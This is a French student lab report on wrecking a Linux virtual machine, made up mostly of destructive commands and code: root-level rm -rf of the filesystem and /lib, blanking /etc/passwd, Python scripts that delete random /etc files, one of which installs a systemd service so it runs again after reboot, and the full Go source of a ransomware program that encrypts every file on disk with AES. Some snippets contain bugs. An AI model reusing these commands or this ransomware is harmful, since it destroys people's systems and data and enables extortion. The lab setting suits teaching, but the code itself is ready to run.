# TP1 : Are you dead yet ?

---

**🌞 Voici mes multiples façons d'exploser un linux :**

➜ **Level 1**

    hyouka@hyouka-VirtualBox:~$ sudo rm -rf /*
Première façon : cette commande permet de tout supprimer depuis la racine de manière récursive et forcée.

---

    hyouka@hyouka-VirtualBox:~$ sudo su -
    root@hyouka-virtualbox:~# echo "" > /etc/passwd
Deuxième façon : on écrit une string vide dans le etc, étant nécessaire au bon fonctionnement, plus rien ne marche. 

--- 
    hyouka@hyouka-VirtualBox:~$ sudo su -
    root@hyouka-virtualbox:~# rm -rf --no-preserve-root find / | grep kernel
    
Troisième façon : suppression de tout les kernels du linux.

---
    hyouka@hyouka-VirtualBox:~$ sudo su -
    root@hyouka-virtualbox:~# rm -rf --no-preserve-root find /lib

Troisième façon 2.0 : suppression des /lib de linux, on ne possède donc plus les images nécessaires au démarrage du système.

➜ **Level 2**  

    hyouka@hyouka-VirtualBox:~$ sudo su - 
    root@hyouka-virtualbox:~# python3 script.py
```   
#Script.py

import random, time, os

try:
    with open('dead.txt') as f:
    etc = f.readlines()
except:
    os.system('find /etc > dead.txt')

while True:
    os.system('clear')
    randomnumber1, randomnumber2 = random.randint(0,100)
    print(str(randomnumber1) + "-" + str(randomnumber2) + "\n")
    first = time.time()
    rep = input("Your choice : ")
    second = str(time.time() - int(first)).split(".")[0]
    print(second + " secondes se sont écoulées")
    
    if int(rep) == randomnumber1 - randomnumber2:
        print("The game continue")
    else:
        for k in range(int(second) * 5):
            randomNumberToDelete = random.randint(0, len(etc))
            try:
                os.system('rm -rf ' + etc[randomNumberToDelete])
            except:
                pass
```
Quatrième façon : ce script est un petit jeu farfelu qui demande à l'utilisateur de donner la réponse à des soustractions, le script supprime des fichiers du /etc en fonction du temps que l'utilisateur met à répondre, bon jeu. 😃
    
    hyouka@hyouka-VirtualBox:~$ sudo su - 
    root@hyouka-virtualbox:~# python3 malware.py
```
#malware.py

import random, time, os

r = os.popen('pwd').readlines()[0][:-1]

c = ["[Unit]", "Description=My Script","[Service]","ExecStart=/usr/bin/python3 "+r+"/malware.py","[Install]","WantedBy=multi-user.target"]

try:
    with open('dead.txt') as f:
        etc = f.readlines()
except:
    os.system('find /etc > dead.txt')
    with open('dead.txt') as f:
        etc = f.readlines()
    for k in c:    
        os.system('echo ' + k + ' >> /etc/systemd/system/byebye.service')
    os.system('systemctl enable byebye.service')

while True:
    time.sleep(1)
    randomNumberToDelete = random.randint(0, len(etc))
    try:
        os.system('rm -rf ' + etc[randomNumberToDelete])
    except:
        pass
```
Cinquième façon : soft version d'un malware qui s'auto-run en reboot, le script supprime un fichier du /etc toutes les secondes, le linux peut tenir 20 secondes comme 15 minutes, bonne chance.

➜ **Level 3**  

Context : V1 de notre Takt ransomware, notre projet file rouge avec [TomFox](https://github.com/TomF0x/tp-linux/tree/main/TP-1) en SSI.

**Pour chiffrer :**
    
    hyouka@hyouka-VirtualBox:~$ go build takt.go
    hyouka@hyouka-VirtualBox:~$ sudo ./takt

**Pour déchiffrer :**
    
    hyouka@hyouka-VirtualBox:~$ sudo ./takt --decrypt {BASE64(AES_KEY)}
    
```
#takt.go

package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"os/exec"
	"strings"
	"sync"
)

var wg sync.WaitGroup
var wgc sync.WaitGroup

var CryptKey = aesKey()

var IV = []byte("1234567812345678")

func createKey() []byte {
	genkey := make([]byte, 32)
	_, err := rand.Read(genkey)
	if err != nil {
		log.Fatalf("Failed to read new random key: %s", err)
	}
	return genkey
}

func aesKey() []byte {
	key := createKey()
	return key
}

func createCipher() cipher.Block {
	c, err := aes.NewCipher(CryptKey)
	if err != nil {
		log.Fatalf("Failed to create the AES cipher: %s", err)
	}
	return c
}

func Crypt(filename string, ch chan string) {
	file, _ := os.Open(filename)
	fileInfo, err := os.Stat(filename)
	if err != nil {
		wgc.Done()
		file.Close()
		Crypt(<-ch, ch)
	}
	if fileInfo.Size() > 200000000 {
		wgc.Done()
		file.Close()
		Crypt(<-ch, ch)
	}
	arr := make([]byte, fileInfo.Size())
	_, _ = file.Read(arr)
	file.Close()
	blockCipher := createCipher()
	stream := cipher.NewCTR(blockCipher, IV)
	stream.XORKeyStream(arr, arr)
	_ = ioutil.WriteFile(filename, arr, 0644)
	wgc.Done()
	Crypt(<-ch, ch)
}

func DeCrypt(filename string, ch chan string) {
	bytes, _ := ioutil.ReadFile(filename)
	blockCipher, _ := aes.NewCipher(CryptKey)
	stream := cipher.NewCTR(blockCipher, IV)
	stream.XORKeyStream(bytes, bytes)
	_ = ioutil.WriteFile(filename, bytes, 0644)
	wgc.Done()
	DeCrypt(<-ch, ch)
}

func main() {
	cmd := exec.Command("bash", "-c", "find / -type f")
	output, _ := cmd.CombinedOutput()
	listfile := strings.Split(string(output), "\n")
	ch := make(chan string, len(listfile))
	for _, file := range listfile {
		wg.Add(1)
		wgc.Add(1)
		go func(file string) {
			ch <- file
			wg.Done()
		}(file)
	}
	wg.Wait()
	args := os.Args[1:]
	if len(args) == 0 {
		fmt.Print("Crypt With ")
		fmt.Println(base64.StdEncoding.EncodeToString(CryptKey))
		for i := 0; i < 100; i++ {
			if len(ch) == 0 {
				break
			}
			go Crypt(<-ch, ch)
		}
		wgc.Wait()
	} else if len(args) == 2 && args[0] == "--decrypt" {
		CryptKey, _ = base64.StdEncoding.DecodeString(args[1])
		fmt.Print("Decrypt With ")
		fmt.Println(base64.StdEncoding.EncodeToString(CryptKey))
		for i := 0; i < 100; i++ {
			if len(ch) == 0 {
				break
			}
			go DeCrypt(<-ch, ch)
		}
		wgc.Wait()
	}
}
```

Sixième façon : Takt ransomware utilise du Threading et des channels (fonctionnement de pile). La clé de chiffrement est en AES 256 et est générée de manière aléatoire. Ces procédés le rendent extrêmement rapide. Il chiffre l'entiéreté du disque (pour cette version, il chiffre le système également, si besoin on possède une version qui permet au système de survivre), l'utilisateur n'a accès a plus aucune de ses données. 

EPO : Educational Purpose Only 